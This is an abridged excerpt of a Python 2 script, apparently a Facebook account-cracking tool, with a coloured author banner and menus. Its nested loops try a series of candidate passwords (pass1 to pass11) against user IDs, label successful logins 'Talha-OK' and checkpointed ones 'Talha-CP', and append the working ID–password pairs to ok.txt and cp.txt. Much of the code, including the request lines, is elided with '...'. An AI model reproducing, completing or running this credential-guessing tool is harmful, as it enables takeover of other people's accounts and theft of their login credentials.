...
\033[1;37m  ╔══════════════════════════════════════╗
\033[1;37m  ║  ➤ \033[1;31mAUTHOR   \033[1;37m: \033[1;32mAbu Talha             \033[1;37m║
\033[1;37m  ║  ➤ \033[1;31mVERSION  \033[1;37m: \033[1;32m2.0                    \033[1;37m║
\033[1;37m  ║  ➤ \033[1;31mFACEBOOK \033[1;37m: \033[1;32mhttps://www.facebook.com/talha4246  \033[1;37m║
\033[1;37m  ╚══════════════════════════════════════╝"""
def main():
    os.system("clear")
    print logo
...
def main_select():
    ...
    if Mz  =="1":
        login()
    if Mz =="2":
        os.system("xdg-open https://www.facebook.com/Talha.X.420")
	main()   
    elif Mz =="0":
        os.system("exit")
    else:
...
def login_select():
	...
	print("[\033[1;97m\033[1;41m-------------login with token-------------\033[0m]").center(50)
        ...
        os.system("xdg-open https://www.facebook.com/Rish.X.420")
    elif Mz =="3":
        main()
...
def menu():
    ...
    os.system("clear")
    print logo
    print("    \t\033[1;97m[\033[1;92m✓\033[1;97m] \033[1;92mTalha ➤ \033[1;91m" +nm)
    print("\033[1;97m--------------------------------------------")
		...
		try:
		    ...
		    if 'www.facebook.com' in d['error_msg']:
		    	...
		    	if "access_token" in d:
		            ...
		            d=json.loads(q)
		            if 'www.facebook.com' in d['error_msg']:
		                print("\x1b[1;97m[\x1b[1;97mTalha-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass1+"\x1b[1;97m | \x1b[1;92m"+name)
		                cp=open("cp.txt","a")
		                cp.write(uid+" | "+pass2+"\n")
		                cp.close()
		                cps.append(uid)
		                ...
		                if 'access_token' in d:
		                    print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass2+" | "+name)
		                    ok=open("ok.txt","a")
		                    ok.write(uid+" | "+pass2+"\n")
		                    ok.close()
		                    oks.append(uid)
		                    ...
		                    if 'www.facebook.com' in d['error_msg']:
		                        ...
		                        if 'access_token' in d:
		                            print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass3+" | "+name)
		                            ok=open("ok.txt","a")
		                            ok.write(uid+" | "+pass3+"\n")
		                            ok.close()
		                            oks.append(uid)
		                            ...
		                            if 'www.facebook.com' in d['error_msg']:
		                                ...
		                                if 'access_token' in d:
		                                    print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass4+" | "+name)
		                                    ok=open("ok.txt","a")
		                                    ok.write(uid+" | "+pass4+"\n")
		                                    ok.close()
		                                    oks.append(uid)
		                                    ...
		                                    if 'www.facebook.com' in d['error_msg']:
		                                        ...
		                                        if 'access_token' in d:
		                                            print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass5+" | "+name)
		                                            ok=open("ok.txt","a")
		                                            ok.write(uid+" | "+pass5+"\n")
		                                            ok.close()
		                                            oks.append(uid)
		                                            ...
		                                            if 'www.facebook.com' in d['error_msg']:
		                                                ...
		                                                if 'access_token' in d:
		                                                    print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass6+" | "+name)
		                                                    ok=open("ok.txt","a")
		                                                    ok.write(uid+" | "+pass6+"\n")
		                                                    ok.close()
		                                                    oks.append(uid)
		                                                    ...
		                                                    if 'www.facebook.com' in d['error_msg']:
		                                                        ...
		                                                        if 'access_token' in d:
		                                                            print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass7+" | "+name)
		                                                            ok=open("ok.txt","a")
		                                                            ok.write(uid+" | "+pass7+"\n")
		                                                            ok.close()
		                                                            oks.append(uid)
		                                                            ...
		                                                            d=json.loads(q)
		                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                print("\x1b[1;97m[\x1b[1;97mTalha-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass8+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                cp=open("cp.txt","a")
		                                                                cp.write(uid+" | "+pass8+"\n")
		                                                                cp.close()
		                                                                cps.append(uid)
		                                                                ...
		                                                                if 'access_token' in d:
		                                                                    print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass8+" | "+name)
		                                                                    ok=open("ok.txt","a")
		                                                                    ok.write(uid+" | "+pass8+"\n")
		                                                                    ok.close()
		                                                                    oks.append(uid)
		                                                                    ...
		                                                                    d=json.loads(q)
		                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                        print("\x1b[1;97m[\x1b[1;97mTalha-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass9+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                        cp=open("cp.txt","a")
		                                                                        cp.write(uid+" | "+pass9+"\n")
		                                                                        cp.close()
		                                                                        cps.append(uid)
		                                                                        ...
		                                                                        if 'access_token' in d:
		                                                                            print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass9+" | "+name)
		                                                                            ok=open("ok.txt","a")
		                                                                            ok.write(uid+" | "+pass9+"\n")
		                                                                            ok.close()
		                                                                            oks.append(uid)
		                                                                            ...
		                                                                            d=json.loads(q)
		                                                                            if 'www.facebook.com' in d['error_msg']:
		                                                                                print("\x1b[1;97m[\x1b[1;97mTalha-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass10+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                cp=open("cp.txt","a")
		                                                                                cp.write(uid+" | "+pass10+"\n")
		                                                                                cp.close()
		                                                                                cps.append(uid)
		                                                                                ...
		                                                                                if 'access_token' in d:
		                                                                                    print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass10+" | "+name)
		                                                                                    ok=open("ok.txt","a")
		                                                                                    ok.write(uid+" | "+pass10+"\n")
		                                                                                    ok.close()
		                                                                                    oks.append(uid)
		                                                                                    ...
		                                                                                    d=json.loads(q)
		                                                                                    if 'www.facebook.com' in d['error_msg']:
		                                                                                        print("\x1b[1;97m[\x1b[1;97mTalha-CP\x1b[1;97m]\x1b[1;91m "+uid+"\x1b[1;97m | \x1b[1;91m"+pass11+"\x1b[1;97m | \x1b[1;92m"+name)
		                                                                                        cp=open("cp.txt","a")
		                                                                                        cp.write(uid+" | "+pass11+"\n")
		                                                                                        cp.close()
		                                                                                        cps.append(uid)
		                                                                                        ...
		                                                                                        if 'access_token' in d:
		                                                                                            print("\t\x1b[1;92m[Talha-OK] "+uid+" | "+pass11+" | "+name)
		                                                                                            ok=open("ok.txt","a")
		                                                                                            ok.write(uid+" | "+pass11+"\n")
		                                                                                            ok.close()
		                                                                                            oks.append(uid)
